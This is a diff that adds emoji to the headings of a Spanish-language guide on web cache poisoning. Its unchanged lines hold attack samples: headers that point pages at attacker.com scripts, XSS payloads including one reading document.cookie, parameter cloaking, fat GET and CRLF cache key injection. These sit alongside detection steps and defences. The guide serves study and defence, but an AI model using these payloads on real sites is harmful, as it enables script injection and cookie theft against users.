@@ -33,7 +33,7 @@ Esta diferencia entre lo que afecta a la respuesta y lo que determina la caché 
 
 ## ⚙️ Cómo funciona Web Cache Poisoning
 
-###  Flujo básico:
+### 🔄 Flujo básico:
 
 1. El atacante identifica una entrada no incluida en la cache key (por ejemplo, `X-Forwarded-Host`)
 2. El servidor usa esa entrada para generar la respuesta
@@ -43,7 +43,7 @@ Esta diferencia entre lo que afecta a la respuesta y lo que determina la caché 
 6. La caché devuelve la respuesta envenenada
 7. El navegador de la víctima ejecuta JavaScript malicioso
 
-###  El desajuste:
+### ⚠️ El desajuste:
 
 ```
 Cache key:        GET / Host: vulnerable.com
@@ -57,7 +57,7 @@ Resultado:        Todos los usuarios cargan JS del atacante
 
 ## 🗝️ Cache keys y unkeyed inputs
 
-###  Componentes típicos de la cache key:
+### ✅ Componentes típicos de la cache key:
 
 ✅ **Incluidos:**
 
@@ -80,7 +80,7 @@ Resultado:        Todos los usuarios cargan JS del atacante
 
 ***
 
-###  Cómo encontrarlos:
+### 🔎 Cómo encontrarlos:
 
 ➡️ **Manual:**
 
@@ -98,7 +98,7 @@ Resultado:        Todos los usuarios cargan JS del atacante
 
 ## 🎯 Tipos de Cache Poisoning
 
-###  Basado en headers:
+### 📨 Basado en headers:
 
 ```http
 X-Forwarded-Host: attacker.com
@@ -110,19 +110,19 @@ Respuesta:
 <script src="https://attacker.com/tracking.js"></script>
 ```
 
-###  Basado en cookies:
+### 🍪 Basado en cookies:
 
 ```http
 Cookie: fehost="}</script><script>alert(1)</script>
 ```
 
-###  Basado en query string:
+### 🔗 Basado en query string:
 
 ```http
 GET /?'><script>alert(1)</script>
 ```
 
-###  Basado en parámetros:
+### 🎯 Basado en parámetros:
 
 ```http
 utm_content='/><script>alert(1)</script>
@@ -132,14 +132,14 @@ utm_content='/><script>alert(1)</script>
 
 ## ⚔️ Técnicas de explotación
 
-###  Headers unkeyed:
+### 📨 Headers unkeyed:
 
 1. Encontrar header vulnerable
 2. Subir JS malicioso
 3. Envenenar caché
 4. Usuarios cargan JS
 
-###  Múltiples headers:
+### 🔀 Múltiples headers:
 
 ```http
 X-Forwarded-Host: attacker.com
@@ -148,7 +148,7 @@ X-Forwarded-Scheme: http
 
 Resultado: redirección maliciosa
 
-###  Parameter Cloaking:
+### 🕵️ Parameter Cloaking:
 
 ```
 /js/geolocate.js?callback=setCountryCookie&utm_content=1;callback=alert(1)
@@ -157,7 +157,7 @@ Resultado: redirección maliciosa
 * Cache interpreta uno
 * Server interpreta dos
 
-###  Fat GET:
+### 🍔 Fat GET:
 
 ```http
 GET /js/geolocate.js
@@ -166,7 +166,7 @@ Content-Length: 18
 callback=alert(1)
 ```
 
-###  Normalización de URL:
+### 🔣 Normalización de URL:
 
 ```
 /random<script>alert(1)</script>
@@ -176,23 +176,23 @@ callback=alert(1)
 
 ## 🛤️ Vectores de ataque
 
-###  XSS vía script:
+### 💉 XSS vía script:
 
 * Target: tracking.js
 * Ataque: header
 
-###  DOM XSS:
+### 🌐 DOM XSS:
 
 ```json
 {"country":"<img src=1 onerror=alert(document.cookie) />"}
 ```
 
-###  Redirección:
+### 🔀 Redirección:
 
 * X-Original-URL
 * X-Forwarded-Host
 
-###  Fragmentos internos:
+### 🧩 Fragmentos internos:
 
 * Caché interna persiste
 
@@ -200,25 +200,25 @@ callback=alert(1)
 
 ## 💥 Cache Busters
 
-###  Query:
+### 🔗 Query:
 
 ```http
 ?cachebuster=abc123
 ```
 
-###  Headers:
+### 📨 Headers:
 
 ```http
 Origin: https://cachebuster123.com
 ```
 
-###  Cookies:
+### 🍪 Cookies:
 
 ```http
 Cookie: cachebuster=abc123
 ```
 
-###  User-Agent:
+### 🌐 User-Agent:
 
 ```http
 User-Agent: Mozilla cachebuster123
@@ -228,19 +228,19 @@ User-Agent: Mozilla cachebuster123
 
 ## 🕵️ Métodos de detección
 
-###  Detectar caché
+### 📡 Detectar caché
 
 * X-Cache
 * Age
 * Cache-Control
 
-### Unkeyed inputs
+### 🔎 Unkeyed inputs
 
 ```http
 X-Forwarded-Host: test123
 ```
 
-###  Puntos de reflexión
+### 📍 Puntos de reflexión
 
 * script
 * link
@@ -248,14 +248,14 @@ X-Forwarded-Host: test123
 * JS
 * redirect
 
-###  Verificar
+### ✅ Verificar
 
 1. Enviar payload
 2. Ver respuesta
 3. Repetir sin header
 4. Si persiste → vulnerable
 
-###  Automatizado:
+### 🤖 Automatizado:
 
 ```python
 requests.get(...)
@@ -265,31 +265,31 @@ requests.get(...)
 
 ## 🛡️ Defensa
 
-###  Minimizar inputs:
+### 🔑 Minimizar inputs:
 
 ```
 proxy_cache_key "$scheme$request_method$host$request_uri";
 ```
 
-###  Eliminar headers:
+### 🚫 Eliminar headers:
 
 * X-Forwarded-Host
 * X-Original-URL
 
-###  Cache-Control:
+### 📋 Cache-Control:
 
 ```http
 Cache-Control: no-store
 ```
 
-###  Validación:
+### ✅ Validación:
 
 ```python
 if forwarded_host not in allowed_hosts:
     forwarded_host = None
 ```
 
-###  Encoding:
+### 🧹 Encoding:
 
 ```html
 <script src="/tracking.js"></script>
@@ -299,22 +299,22 @@ if forwarded_host not in allowed_hosts:
 
 ## 🚀 Técnicas avanzadas
 
-###  Cache key injection:
+### 💉 Cache key injection:
 
 ```http
 Origin: x\r\nContent-Length...
 ```
 
-###  Fragmentación interna:
+### 🧩 Fragmentación interna:
 
 * Persistencia interna
 
-###  Encadenamiento:
+### ⛓️ Encadenamiento:
 
 1. Redirect
 2. Host
 3. DOM XSS
 
-###  Ataques dirigidos:
+### 🎯 Ataques dirigidos:
 
 * User-Agent específico
